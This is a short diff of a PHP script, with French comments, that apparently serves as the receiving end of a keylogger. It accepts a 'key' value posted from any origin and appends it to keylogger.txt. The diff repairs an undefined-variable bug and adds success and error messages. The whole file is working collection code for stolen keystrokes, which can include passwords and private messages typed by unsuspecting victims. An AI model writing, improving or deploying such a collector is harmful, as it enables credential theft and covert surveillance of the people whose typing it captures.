@@ -5,14 +5,28 @@
     header("Access-Control-Allow-Headers: Content-Type");
 
 
-    $keys = $_POST["key"];
-    $filename = 'keylogger.txt';
-    $file = fopen($filename, 'a+');
-    if ($file) {
-        fwrite($file, $v);
-        fclose($file);
+    // Vérifier si une donnée a été envoyée
+    if (isset($_POST['key'])) {
+        $v = $_POST['key']; // Récupérer la donnée envoyée
+    } else {
+        $v = ''; // Assurer que la variable est définie
     }
-    else {
-        echo "Erreur lors de l'ouverture du fichier.";
+
+    // Spécifier le fichier de stockage
+    $file = 'keylogger.txt';
+
+    // Vérifier si $v contient quelque chose avant d'écrire
+    if (!empty($v)) {
+        $handle = fopen($file, "a"); // Ouvrir le fichier en mode ajout
+        if ($handle) {
+            fwrite($handle, $v . PHP_EOL); // Ajouter une nouvelle ligne après chaque entrée
+            fclose($handle);
+            echo "Keys saved successfully!";
+        } else {
+            echo "Error opening file!";
+        }
+    } else {
+        echo "No keys received!";
     }
+    
 ?>
